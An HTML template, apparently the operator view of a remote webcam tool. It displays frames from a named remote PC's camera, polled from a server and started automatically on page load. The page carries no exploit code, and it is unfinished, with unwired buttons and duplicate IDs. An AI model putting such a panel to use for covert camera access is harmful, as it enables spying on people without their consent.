<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Feed</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e2f;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #webcam-feed {
            width: 640px;
            height: 480px;
            background-color: black;
            margin: 20px auto;
            border: 2px solid #4e4e7e;
        }
        button {
            padding: 10px 20px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            background-color: #33FF57;
            color: white;
        }
        button:hover {
            opacity: 0.8;
        }
        #captured-photo {
            margin-top: 20px;
        }
        #error-message {
            color: red;
            margin-top: 20px;
        }
         #webcam-status {
            margin: 10px 0;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .status-active {
            background-color: #33FF57;
            color: #1e1e2f;
        }
        .status-inactive {
            background-color: #FF5733;
            color: white;
        }
    </style>
</head>
<body>
    <h1>Remote Webcam Access</h1>
    <div id="webcam-status" class="status-inactive">Webcam Inactive</div>
    <div id="webcam-feed">
        <img id="webcam-image" src="" alt="Live Webcam Feed" style="width: 100%; height: auto;">
    </div>
    <h1>Live Webcam Feed</h1>
    <div id="webcam-feed">
        <video id="video" autoplay></video>
    </div>
    <div id="error-message"></div>
    <div>
        <button id="capture-photo">Capture Photo</button>
        <button id="start-record">Start Recording</button>
        <button id="stop-record" disabled>Stop Recording</button>
    </div>
    <div id="captured-photo">
        <h2>Captured Photo</h2>
        <canvas id="photo-canvas" style="display: none;"></canvas>
        <img id="photo-output" src="" alt="Captured Photo">
    </div>
    <div id="recorded-video">
        <h2>Recorded Video</h2>
        <video id="video-output" controls></video>
    </div>

    <script>
         const userId = "{{ user_id }}";
        const pcName = "{{ pc_name }}";
        let isStreaming = false;
        let refreshInterval;
        
        // Function to update status display
        function updateStatus(active) {
            const statusDiv = document.getElementById('webcam-status');
            if (active) {
                statusDiv.textContent = "Webcam Active - " + pcName;
                statusDiv.className = "status-active";
            } else {
                statusDiv.textContent = "Webcam Inactive";
                statusDiv.className = "status-inactive";
            }
        }
        
        // Function to start the webcam stream
        function startStream() {
            if (isStreaming) return;
            
            isStreaming = true;
            updateStatus(true);
            
            // Start polling for new frames
            refreshInterval = setInterval(() => {
                const timestamp = new Date().getTime();
                document.getElementById('webcam-image').src = 
                    `/get_latest_frame/${userId}?t=${timestamp}`;
            }, 200); // 5 FPS
            
            console.log("Webcam stream started");
        }
        
        // Function to stop the webcam stream
        function stopStream() {
            if (!isStreaming) return;
            
            clearInterval(refreshInterval);
            isStreaming = false;
            updateStatus(false);
            document.getElementById('webcam-image').src = "";
            
            // Notify server to stop webcam
            fetch(`/stop_webcam/${userId}`, { method: "POST" })
                .catch(err => console.error("Error stopping webcam:", err));
            
            console.log("Webcam stream stopped");
        }
        
        // Initialize
        updateStatus(false);
        
        // Handle beforeunload to clean up
        window.addEventListener('beforeunload', () => {
            stopStream();
        });
        
        // Start stream when page loads (admin requested it)
        startStream();

    </script>
</body>
</html>
